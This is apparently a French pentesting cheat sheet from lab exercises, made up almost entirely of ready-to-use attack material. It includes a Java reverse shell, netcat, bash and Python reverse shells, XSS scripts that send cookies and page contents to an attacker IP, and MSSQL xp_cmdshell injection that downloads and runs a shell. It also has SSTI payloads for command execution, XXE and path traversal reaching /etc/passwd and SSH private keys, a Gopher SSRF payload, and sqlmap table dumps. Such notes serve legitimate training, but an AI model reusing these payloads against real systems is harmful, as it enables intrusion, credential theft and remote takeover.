# Payloads

```bash
# payload universel : 
# SQLi (`'"`), XSS (`<img>`), SSTI (`{{7*7}}`), EL injection (`${7*7}`), 
# Command injection (`sleep 5`)
'"><img src=x>{{7*7}}${7*7};sleep 5
```
## 1. Commandes

### 1.1 Nmap
```bash
nmap LAB
```
```bash
sudo nmap -O -Pn LAB
sudo nmap -sV -O -Pn LAB
sudo nmap -A LAB
nmap -A -sC -T4 -n -Pn -p 22,80,111 LAB
```
### 1.2 gobuster
```bash
gobuster dir -u http://LAB -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://LAB -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

gobuster dir -u http://LAB -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt 

gobuster dir -u http://LAB/templates -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html,php,txt
```

### 1.3 curl
```bash
curl http://LAB/specials?menu=../config/application.properties

curl -I http://LAB 
```

### 1.4 hakrawler
```bash
echo "http://LAB" | hakrawler -u -proxy http://127.0.0.1:8080
```

### 1.5 fuzz
#### 1.5.1 wfuzz
```bash
wfuzz -w paths.txt -w files.txt --hh 0 http://LAB/specials?menu=FUZZFUZ2Z

wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=A4FEDA579BCDFEF6277F6BA336361466 -d "" "http://LAB/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"


wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404,403 "http://LAB/scientific/repository/data/FUZZ.pdf"

```

#### 1.5.2 ffuf
```bash
ffuf -w users.txt:FUZZUSER -w customList.txt:FUZZPASS \
  -fs 4835 \
  -u http://LAB/dev/index.php \
  -X POST \
  -d 'username=FUZZUSER&password=FUZZPASS' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=7cd8f9dd18b031e375b5aba7b9c7b427'
  
  
ffuf -w users.txt:FUZZUSER -w customList.txt:FUZZPASS \
-fs 4835,4895,4897,4898 \
-u http://LAB/dev/index.php \
-X POST \
-d 'username=FUZZUSER&password=FUZZPASS' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: PHPSESSID=7cd8f9dd18b031e375b5aba7b9c7b427'


ffuf -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -X GET -u "http://LAB/scientific/repository/data/FUZZ"
```

### 1.6 cewl
```bash
cewl -w customList.txt --lowercase -m 5 --with-numbers -v http://bambi
```

### 1.7 dirb
```bash
dirb http://LAB
```

---
## 2. Fichiers créés

### 2.1 wordlists
``` bash
# paths.txt
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```

``` bash
# files.txt
application.properties
application.yml
config/application.properties
config/application.yml
```

```bash
# tables.txt
newsletter
newsletters
subscription
subscriptions
newsletter_subscription
newsletter_subscriptions
```

### 2.2 shells

```java
// RevShell.java

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

class RevShell {
    public static void main(String[] args) throws Exception {
	    String host="192.168.45.230";
		int port=4444;
		String cmd="cmd.exe";
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
        
    }
}
```

```bash
# netcat
/bin/nc -nv ATTACKER-IP 9090 -e /bin/bash
```

### 2.3 XSS
```javascript
let cookies = document.cookie;
fetch("http://192.168.45.230/exfil?data="+encodeURIComponent(cookies));
```

```javascript
// xss-html.js
window.location.href = "http://192.168.45.230/?data=" + btoa(document.body.innerHTML);
```

```javascript
// mentor.js

var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
        // Envoie la réponse vers ton serveur Python
        fetch('http://192.168.45.204:80/?response=' + btoa(this.responseText) + '&status=' + this.status);
    }
};
var creds = 'email=mail2@mail.fr&password=password&name=pouet&username=pouet';
xhttp.open("GET", "/admin/users/add?" + creds, true);
xhttp.send();
```

---
## 3. Wordlists utilisées

```bash
# gobuster 
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt


#fuzz
/usr/share/wordlists/seclists/Fuzzing/5-digits-00000-99999.txt
```

----
## 4. Serveurs
### 4.1 Python
```bash
python3 -m http.server 80
```

### 4.2 netcat
```bash
sudo nc -lvnp 4444
```

---
## 5. Payloads

### 5.1 SQL
```sql
1004;SELECT @@VERSION;
1004;SELECT+@@VERSION;
-- 
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
1004;EXECUTE+sp_configure+'show+advanced+options',1;+RECONFIGURE;
--
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
1004;EXECUTE+sp_configure+'xp_cmdshell',1;+RECONFIGURE;
--
1004;EXEC+xp_cmdshell+'curl+http://192.168.45.230:8000/itworked'; 
--
1004;EXEC+xp_cmdshell+'curl+http://192.168.45.230:8000/RevShell.java+--output+%25temp%25/RevShell.java';
--
1004;EXEC+xp_cmdshell+'java+%25temp%25/RevShell.java';  
```


### 5.2 injection dans paramètre

```bash
/var/www; whoami
%2Fvar%2Fwww%2F%;%20whoami

/var/www; which wget; which curl; which nc; which python
%2Fvar%2Fwww%2F%;%20which%20wget;%20which%20curl;%20which%20nc;%20which%20python

/bin/nc -nv ATTACKER-IP 9090 -e /bin/bash
%2Fvar%2Fwww%2F%;%20/bin/nc%20-nv%20192.168.45.230%209090%20-e%20/bin/bash
```

### 5.3 XSS
#### files
```javascript
// xss2.js
let cookies = document.cookie;
fetch("http://192.168.45.230/exfil?data="+encodeURIComponent(cookies));
```

```javascript
// xss-html.js
window.location.href = "http://192.168.45.230/?data=" + btoa(document.body.innerHTML);
```

``` javascript
// xss-rce.js
(async function() {
    // 1. Setup ton listener netcat avant : nc -lvnp 4444
    // et python python3 -m http.server 80 pour voir 
    fetch("http://192.168.45.230/start");
    // 2. Le bot exécute cette commande EN TANT QUE ROOT
    await fetch("http://localhost:3000/run_command", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
            cmd: "bash -c 'bash -i >& /dev/tcp/192.168.45.230/4444 0>&1'",
            //cmd: "curl http://192.168.45.230/pwned",
        })
    });
})();
```

```javascript
// mentor.js

var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
        // Envoie la réponse vers ton serveur Python
        fetch('http://192.168.45.204:80/?response=' + btoa(this.responseText) + '&status=' + this.status);
    }
};
var creds = 'email=mail2@mail.fr&password=password&name=pouet&username=pouet';
xhttp.open("GET", "/admin/users/add?" + creds, true);
xhttp.send();
```
#### injection
``` html
<script src="http://192.168.45.230/xss-html.js"></script>
```

```bash
<script src='http://192.168.45.204/mentor.js'></script>
```
### 5.4SSRF
```bash
sudo service apache2 restart 
sudo tail -f /var/log/apache2/access.log
```
``` bash

htttp://0.0.0.0/admin
http://0.0.0.0/screenshots/fullmoon-demo-screenshots-1.png

http%3a//192.168.45.204/test
http%3a//127.0.0.1/api
```

#### Gopher
```bash
python3 GopherGun.py 

--- Gopher Payload Generator (Interactive Mode) ---
Enter the HTTP method (GET, POST, PUT): POST
Enter the target host (e.g., 127.0.0.1): localhost
Enter the target port (e.g., 80): 80
Enter the request path (e.g., /index.php): /api/admin/create
Enter HTTP headers, one per line (e.g., 'User-Agent: MyClient'). Press Enter on an empty line to finish.
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

Enter the data for the request body:
username=admin&password=password

## payload :
gopher%3A//localhost%3A80/_POST%2520%252Fapi%252Fadmin%252Fcreate%2520HTTP%252F1.1%250D%250AHost%253A%2520localhost%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%253Bcharset%253DUTF-8%250D%250AContent-Length%253A%252032%250D%250A%250D%250Ausername%253Dadmin%2526password%253Dpassword
```
### 5.5 SSTI
#### ejs
```javascript
# payloads de test
{{ 7*7 }}
${ 7*7 }
#{ 7*7 }
<%= 7*7 %>
${7*7}

<p><%= global.process.mainModule.require('child_process').execSync('whoami').toString() %></p>

<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('whoami').toString() %>

<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('cd /root && ls').toString() %>
```

#### mako (python)
```bash
${self.module.cache.util.os.popen("find / -name local.txt 2>/dev/null").read()} 

${self.module.cache.util.os.popen("find / -name proof.txt 2>/dev/null").read()}

#  une fois le path trouvé on affiche le contenu du document
${self.module.cache.util.os.popen("cat /app/proof.txt").read()}
```

```bash
<% import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.228",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); %>
```

### 5.6 Shells
```bash
# PAYLOAD
bash -c 'bash -i >& /dev/tcp/192.168.45.217/9090 0>&1'
# NETCAT
nc -nlvp 9090
```

## 6. Directory traversal

```
<!DOCTYPE data [
<!ENTITY file1 SYSTEM "file:///etc/passwd">
]>
<bio>
&file1;
</bio>

<!DOCTYPE data [
<!ENTITY file1 SYSTEM "file://proof.txt">
]>
<bio>
&file1;
</bio>
```

``` bash
http://piano/siteadmin/dev?piano_f=../../../../../../etc/passwd

../../etc/ssh/sshd_config

../../etc/hosts

# admin= $USER
../../home/admin/.ssh/id_rsa
```

## 7. SQLi
### SQLMap
https://labex.io/tutorials/kali-gain-an-interactive-os-shell-with-sqlmap-594139
https://github.com/sqlmapproject/sqlmap/wiki/usage

Flush : `--flush-session`
```bash
# base
sqlmap -r editflight.txt --batch --risk 3 --level 5 -p piloteMessage,flightNum


# dbnames
sqlmap -r editflight.txt --batch --dbms=PostgreSQL --dbs

# current user
sqlmap -r editflight.txt --batch --current-user


# list tables
sqlmap -r editflight.txt --batch -D public --tables

# list columns 
sqlmap -r editflight.txt --batch -D public -T users --columns

# dump table
sqlmap -r editflight.txt --batch -D public -T users -C email,firstanem,isadmin,lastname,password,user_id,username --dump

# shell
sqlmap -r editflight.txt --os-shell   

```

```bash
# test de tous les paramètres
sqlmap -r login.txt --batch --risk 3 --level 5 -p username,password,dType
```

```bash
# bdd
sqlmap -r login.txt --batch --dbms=mysql --dbs
```

```bash
# current db
sqlmap -r login.txt --batch --current-db
```

```bash
# current user
sqlmap -r login.txt --batch --current-user
```

```bash
# is ds=ba
sqlmap -r login.txt --batch --is-dba
```

```bash
# list tables
sqlmap -r login.txt --batch -D piano_protocol --tables
```

```bash
# list columns
sqlmap -r login.txt --batch -D piano_protocol -T users --columns
```

```bash
# dump data
sqlmap -r login.txt --batch -D piano_protocol -T users -C email,firstname,id,lastname,password,username --dump
```

## 8. ssh

```bash
# créer fichier contenant clef ssh copiée
sudo nano sshkey  
# et changer les permissions
chmod 600 sshkey 


# connexion
 ssh -i sshkey -p 2222 admin@piano

```